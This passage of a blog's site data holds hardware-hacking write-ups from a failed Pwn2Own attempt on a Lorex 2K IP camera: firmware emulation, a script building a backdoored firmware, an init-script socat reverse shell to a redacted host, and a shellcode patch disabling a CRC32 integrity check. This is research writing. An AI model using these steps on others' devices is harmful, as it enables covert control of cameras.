options:\n```bash\n#!/bin/bash\n\nKERNEL=./kernel/linux-4.9.84/arch/arm/boot/zImage\nIMAGE=./image/initramfs.gz\nqemu-system-arm \\\n        -M virt \\\n        -nographic \\\n        -kernel $KERNEL \\\n        -initrd $IMAGE \\\n        -append \"init=/bin/sh\" \\\n        -m 256M \\\n        -snapshot\n```\n\nAnd..\n![[notes/images/pwn2own-23/2.png]]\n\nWe have a working emulated environment!\n\n### Next steps after the emulation\n#### Sonia, can you execute?\nThe first hope we had was to be able to execute the main binaries in order to find a vulnerability on them and develop a reliable exploit. However, things didn't turn out in the best ways. \nAs we have mentioned, most of our target services are exposed from a single binary (`sonia`) and by just executing it, tons of errors were coming out. This is normal and it frequently happens, sometimes it is needed to accomodate some configurations, dependencies or simulate/bypass some behaviors. However, in this case, the `sonia` binary **highly** depends on a multitude of hardware interactions (through character devices of custom kernel modules) that \"accommodating\" everything would required an incredible effort. We even tried to \"cheat\" (just to have at least the web service running) by creating a custom kernel driver (in our compiled kernel) that was returning `0` or `1` (we tried both) on all `open`/`read`/`write`/`ioctl` operations, associating with a symlink all character devices to that one. At first, it seemed to work (the binary was going far away from the previous state) but then it was depending on real data from hardware peripherals and at some point, it was failing and exiting.\n\n#### Deploy custom firmwares\nGoing through the road of emulate hardware interactions was insane due to the time we had allocated, so we choose to use the emulated environment to debug internal behaviors, test cross compiled binaries (unfortunately, we had to) in order to achieve a custom firmware to be deployed in the flash of our target.\n\n## Flashing a custom firmware\nAt first, we thought that by modifying some firmware parts (especially the root file system) we would have broken the boot chain in its early stages (e.g. the bootloader) due to some integrity failures in the firmware image itself. We tried anyway to modify some firmware parts, flash the new firmware and see what happens. At first everything was ok, the system was booting up without any integrity failures and that's the point where we decided to choose that road: modify the firmware just to have a first foothold on it.\n\n### Modify boot parameters\nBy looking at the firmware strings (using the `strings` command) we stumbled in an interesting string at offset `0x300000` that looked exactly like the boot parameters that are given to the kernel from the bootloader:\n\n```plain\nbootargs=mem=64M console=ttyS0,115200 root=/dev/mtdblock5 rootfstype=squashfs\n```\n\nWhat if we change the bootloader arguments to just execute the `/bin/sh` binary? That's what we tried. In order to keep the original size and do less noise as possible, we replaced the string `rootfstype=squashfs` with `init=/bin/sh` instead of just appending. The replacement was not randomly chosen. Since the kernel can easily guess the filesystem type, specifying its type is optional and can be avoided without side effects. We have also padded, with some spaces, missing bytes and ... **we got a shell** !!!\n\nWell, a *read-only*, shell. Just a little detail, right?\n\nUnfortunately we only had read-only access through the UART interface and, also with the herthbreaking `#` in front of us, we could not execute anything.\n\n### Customize the root file system\nOk, with a little bit of disappointment with the first failure, we were still hyped and hopeful to achieve a first foothold in the system by customizing some parts of the firmware. Targeting the root file system directly seemed really interesting because you can interfere with the init process and execute your own commands. We tried to modify some files without evident side effects and the firmware was, oddly, accepted and booted up! However, **after 40 seconds, the system was rebooting itself**...\n\n#### Cleanly extract and repack the filesystem\nAs we have seen previously, binwalk is really useful but, sometimes, having direct control over the most low-level command for a specific task can avoid issues that can potentially be introduced by a third-party tool (e.g. binwalk in this case). For that reason, we directly used `dd`, `unsquashfs` and `mksquashfs` to recreate valid filesystem images. Due to the repetitive nature of this task, we have developed a basic script, called `edward-manidiforbice.sh`, that helped us to automate that process (and avoid common mistakes):\n\n```bash\n#!/bin/bash\n# script: edward manidiforbice v0.3.2\n\ncat \u003c\u003c EOF\n    _    _\n   (_)  / )\n     | (_/\n    _+/\n   //|\\\\\n  // | )\n (/  |/      edward manidiforbice v0.3.2 - by xonoxitron \u0026 kiks\n\nEOF\n\n# Constants\nfw_original=\"firmware_dump.bin\"\nfw_output=\"backdoored_firmware.bin\"\nsquashfs_original=\"squashfs\"\nsquashfs_modified=\"squashfs-mod\"\nsquashfs_out=\"unsquashedfs\"\nsquashfs_size=5835455\nsquashfs_offset=1703936\n\n# Cleaning\nrm -rf squashfs-root/;\nrm backdoored_firmware.bin;\nrm squashfs-mod;\n\necho \"# Extracting squafsh filesystem ...\"\ndd if=\"$fw_original\" of=\"$squashfs_original\" bs=1 skip=$squashfs_offset count=$squashfs_size\nunsquashfs $squashfs_original\n\necho \"# Backdooring filesystem ...\"\n# shirnk other stuff\n# echo 1 \u003e ./squashfs-root/etc/services\t\t\t# 16kb\ncp ./patch/rcS ./squashfs-root/etc/init.d/rcS\nrm ./squashfs-root/bin/dsh \t\t\t# 256kb\n\necho \"# Re-creating backdoored squashfs image ...\"\nmksquashfs ./squashfs-root/ $squashfs_modified -noappend -b 1048576 -Xbcj arm,armthumb -comp xz -Xdict-size 1048576\n\nsquashfs_modified_size=$(stat -c%s \"$squashfs_modified\")\nsize_difference=$(($squashfs_size - squashfs_modified_size))\necho \"# Recreated squashfs image: $squashfs_modified_size\"\necho \"# Difference between FSs: $size_difference bytes\"\n\ncp $fw_original $fw_output\n\ndd if=$squashfs_modified of=$fw_output seek=$squashfs_offset bs=1 conv=notrunc\ndd if=/dev/zero  of=$fw_output seek=$((squashfs_offset + squashfs_modified_size)) count=$size_difference bs=1 conv=notrunc\n\necho \"# Done.\"\n```\n\nThe custom firmware recreation needed to take care of a really important thing: in the firmware image, the root file-system is in between multiple sections, meaning that we cannot recreate a filesystem larger than the one that we have. Another annoying factor is that typically firmwares for embedded devices are usually skinned of everything that is not useful to the production use case, leaving us with a really really limited environment. Other things to be aware are the characteristics of the squashfs file-system that we have:\n- It is a read-only filesystem - we cannot write files at runtime.\n- Its block size is 4KiB (4096 bytes).\n\nWe overcome the read-only file-system issue by manually mounting the sdcard (`mount -o rw,exec /dev/mmc0p1 /mnt/sd`) in the init process and using it to write files at runtime. The second point is crucial when we want to add or delete files in the image. The final image of this file-system is \"aligned\" to 4096 bytes, meaning that it's possible to modify 4.000 bytes without changing the final size of the image but that we need to delete files if we need to write more than that (for that reason, the last lines of the script was checking exactly that before injecting the newly created image in the \"new\" firmware).\n\n#### Backdoor the init process\nWithout hardware input sources, also a customized firmware that spawns a `/bin/sh` on its initialization phase wasn't enough. Also, execute sporadically bash commands was not that interesting. However, if you remember from the [previous article](https://www.hacktivesecurity.com/index.php/2024/12/10/not-all-roads-lead-to-pwn2own-hardware-hacking-part-1/), we had manually soldered ethernet pinouts from the hardware. Instead of just executing a classic `/bin/sh`, we could setup the ethernet interface (modifying the `/etc/init.d/rcS` script) with an assigned IP and, by directly connecting it to our PC, receive a reverse shell to finally have an interactive environment in our target.\n\n```bash\nifconfig eth0 up\nudhcpc -i eth0\nifconfig eth0 \u003cREDACTED\u003e\n```\n\nSetup the interface just requires the above commands that can be inserted inside the `rcS` init script. The reverse shell, however, was not that easy due to the high `busybox` limitations (without `telnetd`, `nc` or any useful command for a direct reverse shell) and that we are also limited in inserting a custom pre-compiled binary due do the size constraints mentioned above. To solve the size limitation we initially opted to re-compile and replace the busybox binary but then went for a quicker solution: remove what could be considered unnecessary for the camera in the system to save some space, and insert a precompiled binary executable that permitted a reverse shell (e.g. a compatible netcat, socat or a C file with a tiny shellcode). In this stage, the qemu environment turned out to be really useful to test things on a \"similar\" environment. At last, we achieved the result by putting a pre-compiled ARM32 EABI version of `socat` and executing it from the `rcS` script:\n\n```bash\n/bin/socat tcp-connect:\u003cREDACTED\u003e:4444 exec:/bin/sh,pty,stderr,setsid,sigint,sane \u0026\n```\n\nAnd now.. we have a working (writable) shell!!\n\nBut again, **after 40 seconds**, the camera was rebooting itself..\n\n#### 40 seconds.. to the hell\nEverything that was done until this point didn't take too much time (few days), the \"nightmare\" started exactly from now on. Having a reverse shell limited to 40 seconds put us in a successful state of mind that was not \"real\", and this was the key point to the failure of the overall project. In our mind, ***we just needed*** to bypass some further integrity checks that were happening in later stages of the system process, but we thought that we were at the \"*95% of the result*\" (cit.). From now on, days and nights of firmware flashing, rabbit holes, reverse engineering, emotions rollercoaster and false hopes were just starting.\n\n#### Freaking dog, is that you?\nWe were now able to execute bash commands through a customized firmware that we could directly flash. Then, after 40 seconds, something reboot the system. This seemed to us like a typical [watchdog](https://developer.toradex.com/software/linux-resources/linux-features/watchdog-linux/) scenario where, *someone at some point given specific conditions*, didn't correctly fed the dog. In fact, watchdog serves specifically for that purpose and is highly adopted in these kind of devices: the system reboot itself if no one has \"interacted\" in a specific way with the watchdog service, \"telling\" him that everything (e.g. the boot init) was fine.\nIn this case, the classic [watchdog linux daemon](https://linux.die.net/man/8/watchdog) was not used but were able to identify similar behaviors in the `rcS` and related scripts. \nInside the `rcS` init script, we can identify the following commands with a chinese comment:\n\n```bash\n# ...\n#å®‰éœ¸çš„çœ‹é—¨ç‹—æœ€å¤§è¶…æ—¶æ—¶é—´åªæœ‰65ç§’ï¼Œæ‰€ä»¥åœ¨soniaå¯åŠ¨å‰å…ˆå–‚ä¸€æ¬¡ç‹—\necho f \u003e /proc/osa_root/pdc/pdcWdt\n# ...\n```\n\nThe translated chinese comment says: \"*The maximum timeout of Ambarella's watchdog is only 65 seconds, so feed the watchdog before starting Sonia*\". We also found the same command in other init scripts (like `/usr/etc/imod` and `/usr/etc/IPCimod`) with the same purpose. We could guess that by writing `f` into `/proc/osa_root/pdc/pdcWdt` we would feed the dog, but to be sure we wanted to quickly reverse engineer the kernel module that was handling it. The previously mentioned `/usr/etc/imod` script (executed from `rcS`) is responsible to load these kernel modules:\n\n```bash\n#!/bin/sh\nbusybox p7zip x /usr/lib/modules.7z /var/tmp/ \u003e /dev/null\nexport KO_PATH=/var/tmp/modules\ninsmod $KO_PATH/mhal.ko isp_thread_priority=98\ninsmod $KO_PATH/mi_common.ko\ninsmod $KO_PATH/mi_sys.ko default_config_path=/usr/config logBufSize=0 cmdQBufSize=256\ninsmod $KO_PATH/mi_sensor.ko\n# ...\n```\n\nWe can extract the `/usr/lib/modules.7z` compressed file and search for the \"pdcWdt\" string occurrence in one of the modules and we quickly identified the `pdc.ko` module. By opening the binary in ghidra, we could easily find its usage:\n![[notes/images/pwn2own-23/3.png]]\n\nWe further reverse engineered the module to undertand its logic and we created tons of firmware with different feeding mechanisms: we `feed` it, set a new one from `start` and also tried to `end` it. All trys just lead to the same issue, a reboot after 40 seconds. Maybe there is another watchdog mechanism that we are not aware of?\n\n#### Sonia, are you feeding the dog?\nDuring this whole process, we also put a lot of effort into reversing (using Binary Ninja) the `sonia` binary, since the \"sonia-centric\" nature of the system. The binary is huge (6.6MB) and stripped (no debug symbols). However, due to the verbose logging on almost all functions, it was easier to recover original function names and understand the main logic. For example, the following `onP2PChannelHandler` function has been renamed like that due to the `may_log` (renamed from us) function call that receives as the third parameter the function or method name:\n![[notes/images/pwn2own-23/4.png]]\n\nBy looking around the binary searching for some watchdog references, we actually found the following function (renamed to `System_startWatchDogTimer`):\n\n```C\n000d6414  int32_t System_startWatchDogTimer(int32_t arg1, int32_t arg2)\n000d6414      int32_t var_c = arg2\n000d6414      int32_t var_10_1 = arg1\n000d6414      \n000d6418      if (arg1 != 0)\n000d6438          if (sub_ae730(0x1a) == 1)\n000d643c              PDI_wdtOpen(arg2)\n000d6440              return 0\n000d6418      else\n000d6420          int32_t var_10 = 0x6d9\n000d642a          log(arg1, 1, \"[libpdi] ERROR  (%s|%d): para: tâ€¦\", \"System_startWatchDogTimer\")\n000d642a      \n000d6444      return 0xffffffff\n```\n\n`PDI_wdtOpen` (manually renamed) is just opening the `/dev/pdcWdt` character device and store the file descriptor into a global variable. The same global variable is used in the following `PDI_wdtFeed` function to perform a specific `ioctl` operation (`0xc0105700`) on the global file descriptor with a custom structure as input (`var_28`):\n```C\n000adc6c  int32_t PDI_wdtFeed(int32_t arg1)\n000adc7e      int32_t var_28 = 0xffffffff\n000adc82      int32_t dev_pdcWdt_1 = dev_pdcWdt\n000adc86      int32_t r0\n000adc86      \n000adc86      if (dev_pdcWdt_1 == 0)\n000adc8e          r0 = open(\"/dev/pdcWdt\", 2, 0xa7c, \u0026data_645000)\n000adc94          dev_pdcWdt = r0\n000adc94      \n000adc96      int32_t dev_pdcWdt_2\n000adc96      char const* const r2\n000adc96      \n000adc96      if (dev_pdcWdt_1 == 0 \u0026\u0026 r0 s\u003c 0)\n000adc9c          int32_t var_30_1 = 0xaa\n000adc9e          dev_pdcWdt_2 = dev_pdcWdt_1\n000adca4          r2 = \"[libpdi] ERROR  (%s|%d): wdt opeâ€¦\"\n000adc96      else if (arg1 == 2 || arg1 == 3 || arg1 == 1)\n000adcbe          int16_t var_24_1 = arg1.w\n000adcbe          \n000adcc8          if (ioctl(dev_pdcWdt, 0xc0105700, \u0026var_28) s\u003e= 0)\n000adcf6              return 0\n000adcf6          \n000adcce          int32_t var_30_2 = 0xcc\n000adcd0          dev_pdcWdt_2 = 0\n000adcd6          r2 = \"[libpdi] ERROR  (%s|%d): Fail toâ€¦\"\n000adcb4      else\n000adce0          int32_t var_30_3 = 0xc4\n000adce2          dev_pdcWdt_2 = 0\n000adce8          r2 = \"[libpdi] ERROR  (%s|%d): The Wdtâ€¦\"\n000adce8      \n000adcec      log(dev_pdcWdt_2, 1, r2, \"PDI_wdtFeed\")\n000adcf0      return 0xffffffff\n```\n\nIs it possible that maybe we need to feed the watchdog from that character device as sonia is doing? For us, it seemed worth to try, the only effort needed was to reconstruct the valid struct for the `ioctl` operation with some reverse engineering.\n\nWe found out that Ghidra was doing a better job than Binary Ninja to reverse engineer ARM32 kernel modules (and vice versa for userland binaries). The `pdcWdt` character device is created in the `pdc.ko` module init function through some vendor customized wrapper functions:\n```C\nundefined4 PDC_wdtInit(void)\n\n{\n  /* .. */\n  if (iVar1 \u003c 0) {\n    OSA_logWrite(0,1,\"[pdc] ERROR  (%s|%d): Fail to create mutex!\\n\",\"PDC_wdtInit\",0x4e2);\n  }\n  else {\n    iVar1 = OSA_spinlockCreate(3,\u0026DAT_00050fd0);\n    if (iVar1 \u003c 0) {\n      OSA_logWrite(0,1,\"[pdc] ERROR  (%s|%d): Fail to create hSpinLock!\\n\",\"PDC_wdtInit\",0x4e8);\n    }\n    else {\n      local_48 = 0;\n      local_44 = 0;\n      local_3c = \u0026gWdtModule;\n      local_40 = \u0026gWdtCdevOps;\n      local_4c = \"pdcWdt\";\n      iVar1 = OSA_kCdevCreate(\u0026local_4c,\u0026gWdtModule);\n      /* ...*/\n```\n\nThe `OSA_kCdevCreate` module creates the `/dev/pdcWdt` device and assign the global `gWdtCdevOps` variable for its file operations, from which we can easily identify the `ioctl` handler (renamed to `WDT_ioctl`) and the previously identified `0xc0105700` ioctl command. By analyzing the kernel ioctl code parsing and the userland sonia feeding logic, we were able to reconstruct a valid C structure that we could use in the ioctl `0xc0105700` command:\n\n```C\nstruct wdt_struct {\n        int s1;\n        int16_t s2;\n        int16_t s3;\n        int16_t s4;\n        int16_t s5;\n        int16_t s6;\n        int16_t s7;\n};\n```\n\nFollowing the sonia binary logic,  `wdt_struct.s1` is always set to `-1` while `wdt_struct.s2` accepts a decremental number starting from 3 to 1. `PDI_wdtFeed` is always called in `PDI_wdtFeed(3)`, `PDI_wdtFeed(2)`, `PDI_wdtFeed(1)` order. The remaining members of the struct are just a padding to avoid memory issues since the kernel is copying from userland (using a `copy_from_user` wrapper) `0x10` bytes.\n\nThe following C program has been created to \"emulate\" the sonia feeding behavior:\n```C\n#include \u003cstdio.h\u003e\n#include \u003cstdlib.h\u003e\n#include \u003csys/ioctl.h\u003e\n#include \u003csys/types.h\u003e\n#include \u003csys/stat.h\u003e\n#include \u003cfcntl.h\u003e\n#include \u003cunistd.h\u003e\n\n#define WATCHDOG_FEED  0xc0105700\n#define DEV_NAME      \"/dev/pdcWdt\"\n\nstruct wdt_struct {\n\tint s1;\n\tint16_t s2;\n\tint16_t s3;\n\tint16_t s4;\n\tint16_t s5;\n\tint16_t s6;\n\tint16_t s7;\n};\n\nint PDI_wdtFeed(int dev_fd, int n){\n  struct wdt_struct wdt_input;\n  int res;\n  printf(\"[*] v2 feeding watchdog with %d\\n\", n);\n  wdt_input.s1 = -1;\n  wdt_input.s2 = n;\n  res = ioctl(dev_fd, WATCHDOG_FEED , \u0026wdt_input);\n  printf(\" =\u003eioctl res: %d\\n\", res);\n  return 0;\n}\n\nint main(int argc, char**argv){\n\tprintf(\"[*] Watchdog feeder through /dev/pdcWdt\\n\");\n  int n_sleep   = atoi(argv[1]);\n  //int dev_fd    = open(DEV_NAME, 2);\n  int dev_fd    = open(DEV_NAME, O_RDWR);\n  if(dev_fd == -1){\n    printf(\"[!] ERROR! cannot open file %s\\n\", DEV_NAME);\n    exit(1);\n  }\n  while(1){\n    PDI_wdtFeed(dev_fd, 3);\n    PDI_wdtFeed(dev_fd, 2);\n    PDI_wdtFeed(dev_fd, 1);\n    printf(\"[*] Sleeping %d seconds\\n\", n_sleep);\n    sleep(n_sleep);\n  }\n\tprintf(\"[*] Watchdog feeder end\\n\");\n}\n```\n\nDue to size issues into recreating the firmware image, we also had to cross compile the binary while dynamically linking to the uClibc library. We did the same for busybox and compile these things with old toolchains and libc libraries is literally not funny at all. However, we compiled and executed it in a loop (as can be seen from the code) and... nothing, the system reboots after 40 seconds, again.\n\n#### Looking from another perspective\nWe tried to feed the dog in multiple different ways, we wanted to achieve a stable reverse shell but couldn't. Maybe we were seeing something from the wrong perspective? We started to create custom firmwares with the only objective to debug early stages and retrieve as much logs as possible (especially from `dmesg`). We have used the mounted sdcard (remember?)  to write the logs and we used background processes to write the output of `dmesg` into `/mnt/sdcard/` (*we were taking into consideration that we were not in an SMP system*).\nAnd from `dmesg` logs, we found some interesting and catchy strings:\n\n```\n...\n[pdc] Both of Chief and Backup File CRC check OK!\n[pdc] phyaddr = 23fc4000, memLen = 2000\n[pdc] DDRdata crc incorrect, Load from sramFile\n...\n```\n\n[CRC](https://en.wikipedia.org/wiki/Cyclic_redundancy_check) could stands for the classic checksum validation mechanism and we can see, from the output, that something is also failing in the integrity validation (*DDRdata crc incorrect*). Of course, that makes sense because we have modified the firmware image and at the start of it there is a CRC32 table (as can be seen from the first binwalk image). By looking around these strings in our already known `pdc.ko` module, we were able to identify, with ghidra, a classic pattern of decompiled code that looks exactly like CRC32 operations:\n\n```C\nuint PDC_crc32(uint param_1,byte *param_2,int param_3)\n{\n  uint uVar1;\n  byte *idx_2;\n  int iVar2;\n  byte *idx;\n  \n  param_1 = ~param_1;\n  if (7 \u003c param_3) {\n    idx = param_2 + 8;\n    iVar2 = param_3;\n    do {\n      iVar2 = iVar2 + -8;\n      uVar1 = *(\u0026crc32_table + ((idx[-8] ^ param_1) \u0026 0xff) * 4) ^ param_1 \u003e\u003e 8;\n      uVar1 = *(\u0026crc32_table + ((uVar1 ^ idx[-7]) \u0026 0xff) * 4) ^ uVar1 \u003e\u003e 8;\n      uVar1 = *(\u0026crc32_table + ((uVar1 ^ idx[-6]) \u0026 0xff) * 4) ^ uVar1 \u003e\u003e 8;\n      uVar1 = *(\u0026crc32_table + ((uVar1 ^ idx[-5]) \u0026 0xff) * 4) ^ uVar1 \u003e\u003e 8;\n      uVar1 = *(\u0026crc32_table + ((uVar1 ^ idx[-4]) \u0026 0xff) * 4) ^ uVar1 \u003e\u003e 8;\n      uVar1 = *(\u0026crc32_table + ((idx[-3] ^ uVar1) \u0026 0xff) * 4) ^ uVar1 \u003e\u003e 8;\n      uVar1 = *(\u0026crc32_table + ((idx[-2] ^ uVar1) \u0026 0xff) * 4) ^ uVar1 \u003e\u003e 8;\n      param_1 = *(\u0026crc32_table + ((idx[-1] ^ uVar1) \u0026 0xff) * 4) ^ uVar1 \u003e\u003e 8;\n      idx = idx + 8;\n    } while (7 \u003c iVar2);\n    uVar1 = param_3 - 8U \u003e\u003e 3;\n    param_3 = (param_3 - 8U) + uVar1 * -8;\n    param_2 = param_2 + (uVar1 + 1) * 8;\n  }\n  if (param_3 != 0) {\n    idx = param_2;\n    do {\n      idx_2 = idx + 1;\n      param_1 = *(\u0026crc32_table + ((*idx ^ param_1) \u0026 0xff) * 4) ^ param_1 \u003e\u003e 8;\n      idx = idx_2;\n    } while (idx_2 != param_2 + param_3);\n  }\n  return ~param_1;\n}\n\n```\n\nThe renamed `PDC_crc32` function is called multiple times in the module and is expected, on valid integrity conditions, to return the content pointed by `param_2 - 1`. This behavior have been identified across all `PDC_crc32` calls with the following pattern:\n\n```bash\nres_crc32 = PDC_crc32(0,piVar1 + 1,*(param_1 + 4) + -4);\nif (res_crc32 != *piVar1) {\n\tOSA_logWrite(2,2,\"[pdc] DDRdata crc incorrect, Load from sramFile\\n\");\n\tmemcpy(*(param_1 + 0x18),*(param_1 + 0x24),*(param_1 + 4));\n}\n```\n\n#### Patching the kernel module CRC32 integrity check\nHaving understood the CRC32 function logic, why not just patch the `PDC_crc32` kernel function to just return something that will pass the integrity verification? \nThis is what we have done and the following ARM32 *THUMB* shellcode is able to change the `PDC_crc32` logic to always successfully pass all checks when called:\n\n```bash\npush.w {r4, r5, r6, r7, r8, sb, sl, lr}\nsub.w  r1, r1, #4\nldr    r0, [r1]\npop.w  {r4, r5, r6, r7, r8, sb, sl, pc}\n```\n\nWe first preserve registers through `push` and `pop` calls and we substract `r1` register and dereference it into the return register `r0`. The shellcode can be generated with the online [ARM assembler/disassembler](https://shell-storm.org/online/Online-Assembler-and-Disassembler/) and with some python scripting (I don't feel comfortable in using Ghidra or some other solutions for that) it's possible to create a customized version of the module:\n\n```python\nimport shutil\nOFFSET = 0x1574\n\nif __name__ == \"__main__\":\n    shutil.copyfile(\"pdc.ko\", \"pdc_modded.ko\")\n    # bd e8 f0 8f     pop.w      {r4,r5,r6,r7,r8,r9,r10,r11,pc}\n    shellcode = b\"\\x2d\\xe9\\xf0\\x47\\xa1\\xf1\\x04\\x01\\x08\\x68\\xbd\\xe8\\xf0\\x87\"\n    with open(\"pdc_modded.ko\", \"r+b\") as file:\n        file.seek(OFFSET)\n        file.write(shellcode)\n```\n\nAfter some debugging through trials and errors we succeeded to make the kernel module working, and... the system rebooted after 40 seconds, again.\n\n## Conclusion \u0026 key takeaways\nAs introduced in the [first article](https://1day.dev/notes/Not-All-Roads-Lead-to-PWN2OWN-Hardware-Hacking-Part-1) of the series, we took too much effort and time into trying to get a stable and working shell to just start the vulnerability research phase. The ability to understand when it's time to move on or to start getting things done with what you have, is an essential skill to maximize the efficiency of these kind of activities. We had also reversed the Android application, some Desktop binaries and tried few other things that weren't mentioned, but what you have read is a good extract of our overall activity on this target.\n\nIf you are interested into black and white box fuzzing, targeting another IoT device, stay tuned for the last part of the series!\n\n## References\n- [MindShaRE: How to â€œJust Emulate It With QEMUâ€](https://www.zerodayinitiative.com/blog/2020/5/27/mindshare-how-to-just-emulate-it-with-qemu)\n- https://developer.toradex.com/software/linux-resources/linux-features/watchdog-linux/\n- https://shell-storm.org/online/Online-Assembler-and-Disassembler/","lastmodified":"2025-04-14T14:14:33.955126385Z","tags":null},"/notes/Not-All-Roads-Lead-to-PWN2OWN-Hardware-Hacking-Part-1":{"title":"Not All Roads Lead to PWN2OWN: Hardware Hacking (Part 1)","content":"\n\u003e **I have not personally written this blog post** but it was the result of a collaboration done in [Hacktive Security](https://www.hacktivesecurity.com/). For the sake of completeness with the other two parts (which you can find in this blog), I have also uploaded this first part.\n\n## Introduction\nNot all stories end with the expected and hoped-for results, and this story is one of them. Weâ€™re releasing a three-part series detailing our unsuccessfulÂ [Pwn2Own](https://en.wikipedia.org/wiki/Pwn2Own)Â 2024 attempt targeting two IP cameras. The contest forces you into a completely different mindset compared to standard security assessment activities. Here, you have only one objective: compromise the target with an unauthenticated RCE exploit. This creates the purest hacking vibes that with a mix of passion and challenge flows directly into pure excitement.\n\nThat excitement, however, led to one of the key causes of our failure: a temporary â€œburnout.â€ For several reasons, we lost too much time (~75%) and effort stuck in the initial phase of obtaining the first interactive shell on just one device (we had purchased two devices). This left us with insufficient time to focus on the core phase: finding vulnerabilities, despite the unstable shell we had via a customized firmware.\n\nHowever, this two-week journey (not much time for this kind of activity) proved incredibly valuable, providing numerous lessons weâ€™ve since shared internally to maximize the positive impact. Along the way, we delved into hardware hacking, reverse engineering, firmware and kernel module patching, fuzzing and crash triaging (**yes, we have discovered some non-exploitable bugs**). If youâ€™re intrigued by these hacky things, hope you will find this hardware hacking article interesting and, stay tuned for the upcoming parts too!\n\nMost of our initial effort focused on the Lorex 2K IP camera. We highly encourage you to also explore the published work of other teams that successfully participated in the Pwn2Own contest:Â [Pwn2Own IoT 2024 â€“ Lorex 2K Indoor Wi-Fi Security Camera](https://www.rapid7.com/globalassets/_pdfs/research/pwn2own-iot-2024-lorex-2k-indoor-wi-fi-security-camera-research.pdf)Â andÂ [Exploiting the Lorex 2K Indoor Wi-Fi at Pwn2Own Ireland](https://blog.infosectcbr.com.au/2024/12/exploiting-lorex-2k-indoor-wifi-at.html).\n\n## Hardware Teardown: Laying the Foundation\nEvery good reversing process begins with understanding the target. Disassembling the Lorex 2K IP Camera was the first step in uncovering its attack surface. Carefully dismantling the cameraâ€™s enclosure (pro tip: a precision screwdriver toolset is your best friend) by disconnecting the unnecessary/unwanted accessories (IR, LED, Microphone, ..), provided access to key components and revealed crucial interfaces.\n\nAÂ **System-on-Chip (SoC), Micro-SD Card slot, Wi-Fi SoC and two Unknown Entry Points:**Â from the label we got a Sigmastar SSC337D as the deviceâ€™s processing core managing all device operations and Realtek RTL8188E as the WiFi chipset. Some unknown entries test points on the PCB suggested accessible UART, SPI, and Ethernet pinouts â€“ prime candidates for hardware exploitation.\n\n![[notes/images/1.png]]\n\n**SPI Flash:**Â Winbond W25Q64JV, a 64Mb memory chip storing the firmware.\n\n![[2 1.png]]\n\n## Step 1: UART Discovery\n\n![[3 2.png]]\n\nTheÂ **Universal Asynchronous Receiver-Transmitter (UART)**Â is a simple two-wire protocol for exchanging serial data. Asynchronous means no shared clock, so for UART to work, the same bit or baud rate must be configured on both sides of the connection. This interface is often a go-to entry point for hardware hackers. The first interface we tackled was theÂ **UART**, a common hardware debugging tool that could give us direct access to the cameraâ€™s system logs. UART is like a debug interface that manufacturers leave open during development, often exposing a wealth of information about the device. On the Lorex 2K, this interface presented a direct way to interact with the deviceâ€™s console output â€“ it was not the case, but this could potentially lead to command injection vulnerabilities during the boot process.\n\n### Probing process\nThe probing was a four step process:\n\n1. **Locating the UART Pins:**Â Using a multimeter, we identified the UART TX, RX, and GND pins on the PCB test pads (figure below).\n2. **Connecting the FTDI-232 Adapter:**Â This adapter converts UART signals to USB, enabling communication via a computer terminal (second figure below).\n3. **Terminal Configuration:**Â We used tools likeÂ `minicom`Â to set the correct baud rate and establish a serial connection.\n4. **Capturing the Output:**Â The terminal displayed detailed boot logs, including kernel messages and filesystem information.\n\n![[notes/images/4.png]]\n\n![[notes/images/5.png]]\n\n### Dumped serial output\n\n```\nIPL g7d092ed\nD-15\n\nHW Reset\n\n\nmount: mounting none on /proc/bus/usb failed: No such file or directory\n\nkeyboard = 1\n/usr/etc/imod: line 1: #!/bin/sh: not found\nsensor Adaptive matching over\nreal SensorType:\nreal aewCfg:IPC-SC401AI-MIPI\n======================IPCimod=====================\nsysbackup_value =Fail\nUS\n[: 1: unknown operand\nappauto=1\n\nIPL g7d092ed\nD-15\n\nWDT Reset\nSPI 54M\n64MB\n\nBIST0_0001-OK\n\nMXP found at 0x0000a000\n\noffset:00004800\n\nChecksum OK\n\n\nIPL_CUST g7d092ed\nMXP found at 0x0000a000\n\noffset:00010000\n\nXZ decomp_size=0x0003c52c\n\nU-Boot 2010.06-svn9272 (Aug 13 2021 - 18:52:24)\n\n\n\n\n\n\n\nmount: mounting none on /proc/bus/usb failed: No such file or directory\n\nkeyboard = 1\n/usr/etc/imod: line 1: #!/bin/sh: not found\nsensor Adaptive matching over\nreal SensorType:\nreal aewCfg:IPC-SC401AI-MIPI\n======================IPCimod=====================\nsysbackup_value =Fail\nUS\n[: 1: unknown operand\nappauto=1\n\nIPL g7d092ed\nD-15\n\nWDT Reset\nSPI 54M\n64MB\n\nBIST0_0001-OK\n\nMXP found at 0x0000a000\n\noffset:00004800\n\nChecksum OK\n\n\nIPL_CUST g7d092ed\nMXP found at 0x0000a000\n\noffset:00010000\n\nXZ decomp_size=0x0003c52c\n\nU-Boot 2010.06-svn9272 (Aug 13 2021 - 18:52:24)\n\n\n\n\n\n\n\nmount: mounting none on /proc/bus/usb failed: No such file or directory\n\nkeyboard = 1\n/usr/etc/imod: line 1: #!/bin/sh: not found\nsensor Adaptive matching over\nreal SensorType:\nreal aewCfg:IPC-SC401AI-MIPI\n======================IPCimod=====================\nsysbackup_value =Fail\nUS\n[: 1: unknown operand\nappauto=1\n```\n\nThe UART output offered a glimpse into the inner workings of the Lorex 2K IP Camera revealing its initialization routines and system behavior. The camera used U-Boot, a widely used bootloader for embedded Linux systems. This confirms a modular, Linux-based architecture, providing flexibility for developers but also potential entry points for attackers. The U-Boot sequence is particularly noteworthy because this bootloader often includes commands for recovery, diagnostics, and firmware updates. If improperly secured, these features can allow attackers to bypass protections and load malicious firmware or extract sensitive data. In our case it was not possible to access the U-Boot menu by rapidly sending â€œ*â€ characters to the serial, while the systemâ€™s booting.\n\nAlthough the UART logs provided information about the hardware peripherals and boot initialization, the device was configured in a way to lock the UART in order to be â€œread-onlyâ€ and do not accept any input from the outside world. We could not send any characters to the device to get an interactive shell and, while this didnâ€™t directly expose to a vulnerability, it laid the groundwork for understanding the systemâ€™s behavior.\n\n## Step 2: Extracting Firmware via SPI Flash\nIf UART is the gateway to the deviceâ€™s behavior, the SPI Flash chip is the vault holding its most prized possession: the firmware. By extracting and analyzing the firmware, the inner hope is to uncover hardcoded credentials, exploitable binaries or outdated libraries that could be used as attack vector to gain unlimited and/or remote access to the camera over the network.\n\n### Extraction Process\nOur target was theÂ **Winbond W25Q64JV**, a 64Mb chip. Using its datasheet as a guide, we connected the chip to aÂ **Raspberry Pi 2**Â via jumper wires.\n\n![[notes/images/6.png]]\n\nThe 